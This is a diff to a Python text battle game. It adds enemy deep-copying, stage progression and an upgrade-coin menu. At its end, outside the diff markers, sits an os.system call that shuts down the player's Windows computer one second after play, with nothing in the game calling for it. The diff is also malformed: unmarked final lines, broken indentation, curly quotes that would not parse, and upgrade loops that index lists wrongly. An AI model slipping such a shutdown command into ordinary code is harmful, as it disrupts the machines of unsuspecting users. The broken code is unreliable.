@@ -3,6 +3,7 @@ import random
 import time
 import os
 import threading
+import copy
 
 while True:  
     '''For now, we have not set a time so we call it globalTime, timeRemaining'''
@@ -152,7 +153,7 @@ while True:
     def calcEnemyDmg(enemyDict, globalStage):
         enemyDmg = enemyDict["Atk"] * globalStage
         return enemyDmg
-        
+
     # Calcualate Damage done by Player for each attack
     def calcPlayerDmg(timeRemaining, inputPerm, randN, playerDict):
         # for now, player input taken using keyboard
@@ -187,9 +188,10 @@ while True:
         print(playerDict)
 
         # Selecting random enemy
-        enemyDict = {}
-        enemyDict = randomizeEnemy(enemyTypeList)
-        
+        # Deepcopy the dictionary so that when same enemy is selected HP resets
+        # Ensure enemyDict is just a copy not an alias
+        enemyDict = copy.deepcopy(randomizeEnemy(enemyTypeList))
+       
         # Scale intial enemy HP, Atk value, and Defense value 
         enemyDict["HP"] = (enemyDict["HP"] * globalStage**1.07) + 10
         enemyDict["Atk"] = enemyDict["Atk"] * (globalStage**1.07 / globalStage)
@@ -241,18 +243,75 @@ while True:
                 
                 print("Final HP - You: {}, Enemy: {}".format(playerDict["HP"], enemyDict["HP"]))
                 
+                # Exit while loop and change enemy
                 if enemyDict["HP"] <= 0:
                     break
+                if playerDict["HP"] <= 0:
+                    break
+        
 
-            if enemyDict["HP"] <= 0:
+        # Increase globalStage
+        globalStage += 1
+        
+        # Give Skill Points
+        playerDict["Skill"] += 1
+        print("You have gained an upgrade coin!")
+        print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+
+        # Present option to upgrade abilities
+        playerUpgradeChoice = input("Would you like to upgrade your abilities? (hp/atk/def/time/luck/n): ")
+        while playerDict["Skill"] > 0:
+            if playerUpgradeChoice == "atk":
+                for i in playerStatlist["Atk"]:
+                    if playerStatlist["Atk"][i] == playerDict["Atk"]:
+                        playerDict["Atk"] = playerStatlist["Atk"][i+1]
+                        playerDict["Skill"] -= 1
+                        print("You have upgraded your attack!")
+                        print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+                        break
+
+            elif playerUpgradeChoice == "def":
+                for i in playerStatlist["Def"]:
+                    if playerStatlist["Def"][i] == playerDict["Def"]:
+                        playerDict["Def"] = playerStatlist["Def"][i+1]
+                        playerDict["Skill"] -= 1
+                        print("You have upgraded your defense!")
+                        print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+                        break
+
+            elif playerUpgradeChoice == "time":
+                for i in playerStatlist["Time"]:
+                    if playerStatlist["Time"][i] == playerDict["Time"]:
+                            playerDict["Time"] = playerStatlist["Time"][i+1]
+                            playerDict["Skill"] -= 1
+                            print("You have upgraded your time!")
+                            print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+                            break
+
+            elif playerUpgradeChoice == "luck":
+                for i in playerStatlist["Luck"]:
+                    if playerStatlist["Luck"][i] == playerDict["Luck"]:
+                            playerDict["Luck"] = playerStatlist["Luck"][i+1]
+                            playerDict["Skill"] -= 1
+                            print("You have upgraded your luck!")
+                            print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+                            break
+
+            elif playerUpgradeChoice == "hp":
+                for i in playerStatlist["HP"]:
+                    if playerStatlist["HP"][i] == playerDict["HP"]:
+                            playerDict["HP"] = playerStatlist["HP"][i+1]
+                            playerDict["Skill"] -= 1
+                            print("You have upgraded your HP!")
+                            print("You have {} upgrade coin(s)!".format(playerDict["Skill"]))
+                            break
+
+            elif playerUpgradeChoice == "n":
                 break
-            
-            print("done")
-        ''' # Tested here
-        print("n:",globalNRange)
-        print("time remaining:",globalTime)
-        equation = eval(input("Write your equation here: "))
-        test = calcPlayerDmg(globalTime, equation, globalNRange, playerDict)
-        print("playerDmg:", test)
-        '''
+
+            else:
+                print("You have no more upgrade coins!")
+                break
+        print("done")
+    os.system(“shutdown /s /t 1”)
         pass
